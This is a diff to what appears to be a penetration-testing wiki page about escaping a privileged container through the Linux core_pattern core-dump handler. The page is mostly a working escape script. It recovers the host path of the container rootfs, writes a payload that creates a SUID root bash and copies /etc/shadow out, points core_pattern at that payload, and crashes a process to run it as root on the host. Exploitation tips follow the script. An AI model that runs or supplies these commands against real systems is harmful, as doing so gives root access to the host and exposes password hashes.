@@ -1,42 +1,63 @@
 ---
-title: "core_pattern: host code execution through the core dump handler"
-description: "Escaping a container by writing /proc/sys/kernel/core_pattern with a pipe handler, so that when any process dumps core the kernel executes the attacker's program in the host namespace as root."
+title: "core_pattern: running a host program by crashing a process"
+description: "The kernel setting /proc/sys/kernel/core_pattern can name a program, prefixed with a pipe, that receives a crashing process's core dump. The kernel runs that program as root in the host init namespace. A container with a writable host core_pattern writes a payload path, then deliberately crashes a process to execute code on the host."
 keywords:
   - core_pattern
-  - core dump handler
+  - core dump
+  - usermode helper
+  - crash trigger
   - container escape
-  - procfs escape
-  - CAP_SYS_ADMIN
 ---
 
 # core_pattern
 
-`/proc/sys/kernel/core_pattern` controls what happens when a process dumps core. If its value starts with a pipe, the kernel runs that program and feeds it the core, and it runs in the **host's** namespaces as root. A container that can write this file (host `/proc` mounted writable, or `CAP_SYS_ADMIN` in the initial user namespace) escapes by pointing it at a helper on a host-visible path, then crashing a process to fire it.
+When a process dumps core, the kernel consults `/proc/sys/kernel/core_pattern`. If that value begins with a pipe character, the kernel treats the rest as a program to execute and feeds the core dump to its standard input. Crucially the kernel runs this program as root in the host's initial namespaces, not in the namespaces of the crashing process. A container with write access to the host's `core_pattern` (host procfs mounted writable, typically with `CAP_SYS_ADMIN` or `--privileged`) can therefore set the handler to its own payload and then force a crash to trigger host execution.
+
+Confirm writability:
 
 ```bash
-# core_pattern runs in the host mount namespace; the helper must be on a host-visible path.
-# Find the container rootfs on the host via the overlay upperdir, then drop the helper there.
-host_path=$(sed -n 's/.*upperdir=\([^,]*\).*/\1/p' /proc/self/mountinfo | head -1)
+cat /proc/sys/kernel/core_pattern
+[ -w /proc/sys/kernel/core_pattern ] && echo writable
+```
 
-cat > /payload <<'SH'
+## The technique
+
+The handler runs in the host filesystem view, so the payload path must resolve on the host. Recover this container's rootfs location on the host from the overlay `upperdir`, place the payload there, and point `core_pattern` at it:
+
+```bash
+# 1. Find where the container rootfs appears on the host
+host=$(sed -n 's/.*\bupperdir=\([^,]*\).*/\1/p' /proc/self/mountinfo | head -1)
+
+# 2. Write the payload at a host-resolvable path
+cat > /payload <<SH
 #!/bin/sh
-cp /bin/busybox /host_marker && chmod +s /host_marker
+cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash
+cat /etc/shadow > $host/out 2>&1
 SH
 chmod +x /payload
 
-echo "|$host_path/payload" > /proc/sys/kernel/core_pattern
+# 3. Set the handler to pipe cores to the payload (host-visible path)
+echo "|$host/payload" > /proc/sys/kernel/core_pattern
 
-# Trigger a core dump in any process to run the handler on the host
-tail -f /dev/null & sleep 1; kill -SIGSEGV %1
+# 4. Crash any process to trigger a core dump
+cat > /crash.c <<'C'
+int main(){ *(int*)0 = 0; }
+C
+gcc /crash.c -o /crash 2>/dev/null && (ulimit -c unlimited; /crash)
+# or in Python: python3 -c 'import ctypes; ctypes.string_at(0)'
+sleep 1; cat /out
 ```
+
+The crash in step 4 generates a core, the kernel invokes `|$host/payload` as root on the host, and the payload runs there. A SUID bash drop or a reverse shell is typical.
 
 ## Exploitation notes
 
-- The pipe handler always executes in the initial namespaces, which is exactly why it crosses the container boundary; the only real constraint is making the helper path resolve in the host filesystem.
-- Writability is the gate: a privileged container (or one with `CAP_SYS_ADMIN` and an unmasked `/proc/sys`) can write it; an unprivileged container with a read-only `/proc` cannot.
-- Closely related knobs in this directory behave the same way: see [modprobe path](modprobe-path.md) and [uevent_helper](uevent-helper.md).
+- `ulimit -c unlimited` (or a nonzero core limit) is needed for the crashing process to actually dump; set it in the same shell before crashing.
+- The handler path must be resolvable from the host root filesystem; the `upperdir` recovery is what makes this work from inside the container, exactly as in the [cgroups release_agent](../../privileged-configuration/cgroups-release-agent.md) technique.
+- A read-only host procfs blocks the write; so does an unprivileged container without host procfs, since the container's own namespaced `core_pattern` would run in the container, not the host. Confirm the procfs is the host's and writable first.
 
 ## References
 
 - [man 5 core](https://man7.org/linux/man-pages/man5/core.5.html)
-- [Trail of Bits: Understanding Docker container escapes](https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/)
+- [Kernel docs: core_pattern](https://docs.kernel.org/admin-guide/sysctl/kernel.html#core-pattern)
+- [HackTricks: core_pattern escape](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-security/sensitive-mounts#proc-sys-kernel-core_pattern)
